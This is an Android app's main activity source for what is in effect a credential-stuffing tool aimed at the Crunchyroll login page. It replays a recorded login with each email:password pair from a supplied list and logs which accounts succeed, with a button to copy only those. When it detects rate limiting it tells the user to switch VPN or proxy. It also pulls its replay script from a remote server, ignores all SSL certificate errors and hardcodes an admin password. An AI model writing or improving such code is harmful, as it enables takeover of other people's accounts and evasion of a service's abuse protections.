package com.dtech.automation;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.http.SslError;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Log;
import android.webkit.JavascriptInterface;
import android.webkit.SslErrorHandler;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class MainActivity extends Activity {

    private static final String TAG = "WebAutomation";
    private WebView mWebView;
    private final String mainUrl = "https://sso.crunchyroll.com/login";
    private Button btnRecord, btnStop, btnPlay, btnStopBatch, btnSettings, btnResults, btnExportScript, btnInfo, btnAdSystem;

    private boolean isRecording = false;
    private boolean isReplaying = false;
    private long recordingStartTime = 0;
    private long replayStartTime = 0;
    private int lastExecutedIndex = -1;

    // Batch Execution State
    private List<String> credentialList = new ArrayList<>();
    private int currentCredentialIndex = 0;
    private boolean isBatchRunning = false;
    private int verificationAttempts = 0;
    private static final int MAX_VERIFICATION_ATTEMPTS = 15; // ~30 seconds

    // We store events in a synchronized list to handle multi-threaded access from Bridge
    private List<JSONObject> currentSessionEvents = Collections.synchronizedList(new ArrayList<>());

    // Auto Ad Check
    private android.os.Handler adCheckHandler = new android.os.Handler();
    private Runnable adCheckRunnable;

    // Batch Logic Handlers
    private android.os.Handler batchHandler = new android.os.Handler();
    private Runnable verificationRunnable;
    private Runnable nextCredentialRunnable;

    private static final String PREFS_NAME = "AutomationPrefs";
    private static final String KEY_EVENTS = "saved_events";

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mWebView = findViewById(R.id.activity_main_webview);
        btnRecord = findViewById(R.id.btn_record);
        btnStop = findViewById(R.id.btn_stop);
        btnPlay = findViewById(R.id.btn_play);
        btnStopBatch = findViewById(R.id.btn_stop_batch);
        btnSettings = findViewById(R.id.btn_settings);
        btnResults = findViewById(R.id.btn_results);
        btnExportScript = findViewById(R.id.btn_export_script);
        btnInfo = findViewById(R.id.btn_info);
        btnAdSystem = findViewById(R.id.btn_ad_system);

        setupWebView();
        setupButtons();

        loadSavedEvents();
        fetchRemoteScript();

        if (isConnected()) {
            mWebView.loadUrl(mainUrl);
        } else {
            showOfflineDialog();
        }

        startAdChecker();
    }

    private void fetchRemoteScript() {
        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL("https://www.preasx24.co.za/navigation.json");
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setRequestMethod("GET");

                if (conn.getResponseCode() == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        sb.append(line);
                    }
                    reader.close();

                    String jsonResponse = sb.toString();
                    // Validate JSON
                    JSONArray jsonArray = new JSONArray(jsonResponse);

                    // Save and Update
                    runOnUiThread(() -> {
                        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                        prefs.edit().putString(KEY_EVENTS, jsonResponse).apply();

                        // Update memory
                        currentSessionEvents.clear();
                        try {
                            for (int i = 0; i < jsonArray.length(); i++) {
                                currentSessionEvents.add(jsonArray.getJSONObject(i));
                            }
                            Log.i(TAG, "Remote script fetched and updated: " + currentSessionEvents.size() + " events");
                        } catch (JSONException e) {
                            Log.e(TAG, "Error updating memory from remote", e);
                        }
                    });
                } else {
                    Log.e(TAG, "Remote fetch failed: " + conn.getResponseCode());
                }
            } catch (Exception e) {
                Log.e(TAG, "Error fetching remote script", e);
            }
        }).start();
    }

    private void setupWebView() {
        WebSettings webSettings = mWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setAllowFileAccess(true);
        webSettings.setAllowContentAccess(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setDatabaseEnabled(true);

        mWebView.addJavascriptInterface(new WebAppInterface(this), "Android");

        mWebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed();
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return false;
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                return false;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.d(TAG, "Page loaded: " + url);

                if (isRecording) {
                    injectRecorder();
                } else if (isReplaying) {
                     // Check if we are waiting for a clean start
                     if (isBatchRunning) {
                         // Only inject if we are sure we are on the login page and ready
                         if (url.startsWith(mainUrl)) {
                             // Inject with a slight delay to ensure DOM is ready
                             mWebView.postDelayed(() -> injectReplayer(), 1500);
                         }
                     } else {
                         injectReplayer(); // Manual replay
                     }
                }
            }
        });
    }

    private void setupButtons() {
        // Default State: Hide Admin Controls
        btnRecord.setVisibility(android.view.View.GONE);
        btnStop.setVisibility(android.view.View.GONE);
        btnExportScript.setVisibility(android.view.View.GONE);
        btnStopBatch.setVisibility(android.view.View.GONE);

        btnRecord.setOnClickListener(v -> startRecording());
        btnStop.setOnClickListener(v -> stopRecording());
        btnPlay.setOnClickListener(v -> startBatchReplay());
        btnStopBatch.setOnClickListener(v -> stopBatch());
        btnSettings.setOnClickListener(v -> startActivity(new android.content.Intent(this, SettingsActivity.class)));
        btnSettings.setOnLongClickListener(v -> {
            showAdminLoginDialog();
            return true;
        });
        btnResults.setOnClickListener(v -> showBatchResults());
        btnExportScript.setOnClickListener(v -> exportCurrentScript());

        btnInfo.setOnClickListener(v -> startActivity(new android.content.Intent(this, InfoActivity.class)));
        btnAdSystem.setOnClickListener(v -> startActivity(new android.content.Intent(this, AdSystemActivity.class)));
    }

    private void showAdminLoginDialog() {
        android.view.View dialogView = android.view.LayoutInflater.from(this).inflate(R.layout.dialog_admin_login, null);
        android.widget.EditText etUser = dialogView.findViewById(R.id.et_username);
        android.widget.EditText etPass = dialogView.findViewById(R.id.et_password);

        new AlertDialog.Builder(this)
            .setTitle("Admin Login")
            .setView(dialogView)
            .setPositiveButton("Login", (dialog, which) -> {
                String user = etUser.getText().toString();
                String pass = etPass.getText().toString();
                if ("admin".equals(user) && "preasx24".equals(pass)) {
                    enableAdminMode();
                } else {
                    Toast.makeText(this, "Invalid Credentials", Toast.LENGTH_SHORT).show();
                }
            })
            .setNegativeButton("Cancel", null)
            .show();
    }

    private void enableAdminMode() {
        btnRecord.setVisibility(android.view.View.VISIBLE);
        btnStop.setVisibility(android.view.View.VISIBLE);
        btnExportScript.setVisibility(android.view.View.VISIBLE);
        Toast.makeText(this, "Admin Mode Enabled", Toast.LENGTH_SHORT).show();
    }

    private void exportCurrentScript() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String jsonString = prefs.getString(KEY_EVENTS, "[]");

        android.content.Intent sendIntent = new android.content.Intent();
        sendIntent.setAction(android.content.Intent.ACTION_SEND);
        sendIntent.putExtra(android.content.Intent.EXTRA_TEXT, jsonString);
        sendIntent.setType("text/plain");

        android.content.Intent shareIntent = android.content.Intent.createChooser(sendIntent, "Export Navigation JSON");
        startActivity(shareIntent);
    }

    private void startRecording() {
        isRecording = true;
        isReplaying = false;
        recordingStartTime = System.currentTimeMillis();
        currentSessionEvents.clear(); // Start fresh

        Toast.makeText(this, "Recording Started", Toast.LENGTH_SHORT).show();
        injectRecorder();
    }

    private void stopRecording() {
        if (!isRecording) return;
        isRecording = false;
        saveSessionToPrefs();
        Toast.makeText(this, "Stopped & Saved " + currentSessionEvents.size() + " events", Toast.LENGTH_SHORT).show();
    }

    private void startBatchReplay() {
        if (currentSessionEvents.isEmpty()) {
            Toast.makeText(this, "No saved session to replay. Record one first.", Toast.LENGTH_SHORT).show();
            return;
        }

        // Load credentials
        SharedPreferences prefs = getSharedPreferences(SettingsActivity.PREFS_NAME, MODE_PRIVATE);
        String creds = prefs.getString(SettingsActivity.KEY_CREDENTIALS, "");
        if (creds.isEmpty()) {
            Toast.makeText(this, "No credentials found. Check Settings.", Toast.LENGTH_SHORT).show();
            return;
        }

        credentialList.clear();
        String[] lines = creds.split("\n");
        for (String line : lines) {
            if (line.contains(":")) {
                credentialList.add(line.trim());
            }
        }

        if (credentialList.isEmpty()) {
            Toast.makeText(this, "No valid credentials parsed.", Toast.LENGTH_SHORT).show();
            return;
        }

        isRecording = false;
        isReplaying = true;
        isBatchRunning = true;
        currentCredentialIndex = 0;

        btnPlay.setVisibility(android.view.View.GONE);
        btnStopBatch.setVisibility(android.view.View.VISIBLE);

        Toast.makeText(this, "Starting Batch Replay: " + credentialList.size() + " accounts", Toast.LENGTH_SHORT).show();
        processNextCredential();
    }

    private void stopBatch() {
        isBatchRunning = false;
        isReplaying = false;

        // Remove all pending callbacks
        if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);
        if (nextCredentialRunnable != null) batchHandler.removeCallbacks(nextCredentialRunnable);

        btnPlay.setVisibility(android.view.View.VISIBLE);
        btnStopBatch.setVisibility(android.view.View.GONE);

        Toast.makeText(this, "Batch Execution Stopped", Toast.LENGTH_SHORT).show();
    }

    private void processNextCredential() {
        if (!isBatchRunning) return;

        if (currentCredentialIndex >= credentialList.size()) {
            stopBatch(); // Reset UI state
            runOnUiThread(() -> new AlertDialog.Builder(MainActivity.this)
                .setTitle("Batch Complete")
                .setMessage("Processed all accounts.")
                .setPositiveButton("OK", null)
                .show());
            return;
        }

        String currentPair = credentialList.get(currentCredentialIndex);
        Log.d(TAG, "Processing: " + currentPair);

        // Cancel any lingering callbacks
        if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);

        // Clear cookies to ensure fresh login
        android.webkit.CookieManager.getInstance().removeAllCookies(null);
        android.webkit.WebStorage.getInstance().deleteAllData();

        replayStartTime = System.currentTimeMillis();
        lastExecutedIndex = -1;

        // Ensure we are on the correct URL before injecting anything
        // Force reload to ensure clean state even if URL matches
        mWebView.loadUrl(mainUrl);
    }

    private void injectRecorder() {
        Log.d(TAG, "Injecting Recorder Script");
        String js = readAssetFile("recorder.js");
        // Inject start time variable first
        String setup = "window.recordingStartTime = " + recordingStartTime + ";";
        mWebView.evaluateJavascript(setup + js, null);
    }

    private void injectReplayer() {
        if (!isReplaying) return;

        Log.d(TAG, "Injecting Replayer Script");
        String js = readAssetFile("replayer.js");

        verificationAttempts = 0;

        // Get current credentials
        String email = "";
        String pass = "";
        if (isBatchRunning && currentCredentialIndex < credentialList.size()) {
            String[] parts = credentialList.get(currentCredentialIndex).split(":", 2);
            if (parts.length > 0) email = parts[0].trim();
            if (parts.length > 1) pass = parts[1].trim();
        }

        // Convert list to JSON string
        JSONArray jsonArray = new JSONArray(currentSessionEvents);
        String eventsJson = jsonArray.toString();

        // Use JSON object for overrides to avoid escaping issues
        JSONObject overrides = new JSONObject();
        try {
            overrides.put("email", email);
            overrides.put("password", pass);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating override JSON", e);
        }

        // Inject events, start time, and progress
        String setup = "window.replayEvents = " + eventsJson + "; " +
                       "window.replayStartTime = " + replayStartTime + "; " +
                       "window.lastExecutedIndex = " + lastExecutedIndex + "; " +
                       "var overrides = " + overrides.toString() + "; " +
                       "window.overrideEmail = overrides.email; " +
                       "window.overridePassword = overrides.password;";

        mWebView.evaluateJavascript(setup + js, null);

        // Start checking for results after the estimated replay duration
        long replayDuration = 0;
        if (!currentSessionEvents.isEmpty()) {
            try {
                JSONObject last = currentSessionEvents.get(currentSessionEvents.size() - 1);
                replayDuration = last.getLong("time");
            } catch (JSONException e) {}
        }

        // Define the verification runnable
        verificationRunnable = this::checkVerificationStatus;
        // Wait at least the replay duration + 5 seconds for network
        batchHandler.postDelayed(verificationRunnable, replayDuration + 5000);
    }

    private void checkVerificationStatus() {
        if (!isBatchRunning) return;

        if (verificationAttempts >= MAX_VERIFICATION_ATTEMPTS) {
            logResult(false, "Timeout waiting for result");
            moveToNext();
            return;
        }
        verificationAttempts++;

        String js = readAssetFile("verifier.js");
        mWebView.evaluateJavascript(js, value -> {
            if (!isBatchRunning) return; // Stop if batch was stopped during eval

            if (value != null && value.length() > 2) {
                 String jsonStr = value;
                 if (jsonStr.startsWith("\"") && jsonStr.endsWith("\"")) {
                     jsonStr = jsonStr.substring(1, jsonStr.length() - 1);
                     jsonStr = jsonStr.replace("\\\"", "\"");
                 }

                 try {
                     JSONObject res = new JSONObject(jsonStr);
                     String status = res.getString("status");

                     if ("success".equals(status)) {
                         logResult(true, res.optString("detail"));
                         moveToNext();
                     } else if ("failure".equals(status)) {
                         logResult(false, res.optString("detail"));
                         moveToNext();
                     } else if ("rate_limit".equals(status)) {
                         handleRateLimit();
                     } else {
                         // Still pending
                         Log.d(TAG, "Verification pending: " + res.optString("detail"));
                         verificationRunnable = this::checkVerificationStatus;
                         batchHandler.postDelayed(verificationRunnable, 2000);
                     }
                 } catch (JSONException e) {
                     Log.e(TAG, "Error parsing verification result: " + value, e);
                     verificationRunnable = this::checkVerificationStatus;
                     batchHandler.postDelayed(verificationRunnable, 2000);
                 }
            } else {
                verificationRunnable = this::checkVerificationStatus;
                batchHandler.postDelayed(verificationRunnable, 2000);
            }
        });
    }

    private void handleRateLimit() {
        Log.w(TAG, "Rate Limit Detected! Pausing...");

        // Remove pending verifications
        if (verificationRunnable != null) batchHandler.removeCallbacks(verificationRunnable);

        // Show Dialog
        runOnUiThread(() -> {
            AlertDialog dialog = new AlertDialog.Builder(this)
                .setTitle("Rate Limit Detected")
                .setMessage("Waiting 5 minutes...\nPlease connect to a VPN/Proxy.")
                .setCancelable(false)
                .setPositiveButton("I Connected VPN - Continue", (d, w) -> {
                    // User manually continued
                     d.dismiss();
                     // Retry the SAME credential
                     Toast.makeText(this, "Resuming...", Toast.LENGTH_SHORT).show();
                     processNextCredential();
                })
                .create();
            dialog.show();

            // 5 Minute Countdown
            new CountDownTimer(300000, 1000) {
                public void onTick(long millisUntilFinished) {
                    if (dialog.isShowing()) {
                        dialog.setMessage("Waiting " + (millisUntilFinished / 1000) + "s...\nPlease connect to a VPN/Proxy.");
                    } else {
                        cancel();
                    }
                }

                public void onFinish() {
                    if (dialog.isShowing()) {
                        dialog.dismiss();
                        if (isBatchRunning) {
                            Toast.makeText(MainActivity.this, "Time's up. Retrying...", Toast.LENGTH_SHORT).show();
                            processNextCredential();
                        }
                    }
                }
            }.start();
        });
    }

    private void logResult(boolean success, String detail) {
        String cred = credentialList.get(currentCredentialIndex);
        String status = success ? "SUCCESS" : "FAILURE";
        String msg = status + " " + cred + " (powered by DTECH)";
        Log.i(TAG, "Batch Result: " + msg);
        runOnUiThread(() -> Toast.makeText(this, msg, Toast.LENGTH_SHORT).show());
        saveResultToFile(msg);
    }

    private void saveResultToFile(String resultLine) {
        try {
            java.io.FileOutputStream fos = openFileOutput("batch_results.txt", MODE_APPEND);
            fos.write((resultLine + "\n").getBytes());
            fos.close();
        } catch (IOException e) {
            Log.e(TAG, "Failed to save result", e);
        }
    }

    private void showBatchResults() {
        try {
            java.io.FileInputStream fis = openFileInput("batch_results.txt");
            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            reader.close();

            String results = sb.toString();
            new AlertDialog.Builder(this)
                .setTitle("Batch Results")
                .setMessage(results.length() > 0 ? results : "No results yet.")
                .setPositiveButton("OK", null)
                .setNegativeButton("Share", (d, w) -> shareResults(results))
                .setNeutralButton("Options", (d, w) -> showResultOptions(results))
                .show();

        } catch (IOException e) {
            Toast.makeText(this, "No results found.", Toast.LENGTH_SHORT).show();
        }
    }

    private void showResultOptions(String results) {
        String[] options = {"Copy Success Only", "Clear Results"};
        new AlertDialog.Builder(this)
            .setTitle("Options")
            .setItems(options, (dialog, which) -> {
                if (which == 0) {
                    copySuccessResults(results);
                } else if (which == 1) {
                    deleteFile("batch_results.txt");
                    Toast.makeText(this, "Results Cleared", Toast.LENGTH_SHORT).show();
                }
            })
            .show();
    }

    private void copySuccessResults(String fullResults) {
        StringBuilder successOnly = new StringBuilder();
        String[] lines = fullResults.split("\n");
        for (String line : lines) {
            if (line.contains("SUCCESS")) {
                successOnly.append(line).append("\n");
            }
        }

        if (successOnly.length() == 0) {
             Toast.makeText(this, "No successful results to copy", Toast.LENGTH_SHORT).show();
             return;
        }

        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        android.content.ClipData clip = android.content.ClipData.newPlainText("Success Results", successOnly.toString());
        clipboard.setPrimaryClip(clip);
        Toast.makeText(this, "Success results copied to clipboard", Toast.LENGTH_SHORT).show();
    }

    private void shareResults(String results) {
        if (results == null || results.isEmpty()) {
            Toast.makeText(this, "Nothing to share", Toast.LENGTH_SHORT).show();
            return;
        }
        // Results are already formatted line-by-line in logResult
        android.content.Intent sendIntent = new android.content.Intent();
        sendIntent.setAction(android.content.Intent.ACTION_SEND);
        sendIntent.putExtra(android.content.Intent.EXTRA_TEXT, results);
        sendIntent.setType("text/plain");

        startActivity(android.content.Intent.createChooser(sendIntent, "Share Results"));
    }

    private void startAdChecker() {
        adCheckRunnable = new Runnable() {
            @Override
            public void run() {
                long nextAdTime = AdManager.getNextAdTime(MainActivity.this);
                if (System.currentTimeMillis() >= nextAdTime) {
                    triggerAutoAd();
                }
                adCheckHandler.postDelayed(this, 30000); // Check every 30 seconds
            }
        };
        adCheckHandler.postDelayed(adCheckRunnable, 5000);
    }

    private void triggerAutoAd() {
        Log.i(TAG, "Triggering Auto Ad");
        AdManager.resetAutoAdTimer(this);
        String url = AdManager.getRandomAdUrl();
        android.content.Intent intent = new android.content.Intent(this, AdActivity.class);
        intent.putExtra("url", url);
        startActivity(intent);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        adCheckHandler.removeCallbacks(adCheckRunnable);
    }

    private void moveToNext() {
        currentCredentialIndex++;
        nextCredentialRunnable = this::processNextCredential;
        batchHandler.postDelayed(nextCredentialRunnable, 1500);
    }

    private void saveSessionToPrefs() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        JSONArray jsonArray = new JSONArray(currentSessionEvents);
        editor.putString(KEY_EVENTS, jsonArray.toString());
        editor.apply();
    }

    private void loadSavedEvents() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String jsonString = prefs.getString(KEY_EVENTS, "[]");
        try {
            JSONArray jsonArray = new JSONArray(jsonString);
            currentSessionEvents.clear();
            for (int i = 0; i < jsonArray.length(); i++) {
                currentSessionEvents.add(jsonArray.getJSONObject(i));
            }
        } catch (JSONException e) {
            Log.e(TAG, "Error loading events", e);
        }
    }

    private String readAssetFile(String fileName) {
        try {
            InputStream is = getAssets().open(fileName);
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            return sb.toString();
        } catch (IOException e) {
            Log.e(TAG, "Error reading asset: " + fileName, e);
            return "";
        }
    }

    @Override
    public void onBackPressed() {
        if (mWebView.canGoBack()) {
            mWebView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    private void showOfflineDialog() {
        new AlertDialog.Builder(this)
            .setTitle("No Internet Connection")
            .setMessage("Please check your internet connection and restart the app.")
            .setCancelable(false)
            .setPositiveButton("Exit", (dialog, which) -> finish())
            .show();
    }

    private boolean isConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        return netInfo != null && netInfo.isConnected();
    }

    public class WebAppInterface {
        Context mContext;

        WebAppInterface(Context c) {
            mContext = c;
        }

        @JavascriptInterface
        public void showAd(String url) {
           // Kept for backward compatibility
        }

        @JavascriptInterface
        public void saveSession(String jsonString) {
           // Deprecated: We now stream events. Keeping empty stub just in case of old cache.
        }

        @JavascriptInterface
        public void recordEvent(String eventJson) {
            try {
                JSONObject event = new JSONObject(eventJson);
                currentSessionEvents.add(event);
                Log.d(TAG, "Recorded event: " + event.getString("type"));
            } catch (JSONException e) {
                Log.e(TAG, "Failed to parse event", e);
            }
        }

        @JavascriptInterface
        public void eventExecuted(int index) {
            if (index > lastExecutedIndex) {
                lastExecutedIndex = index;
                Log.d(TAG, "Executed event index: " + index);
            }
        }
    }
}
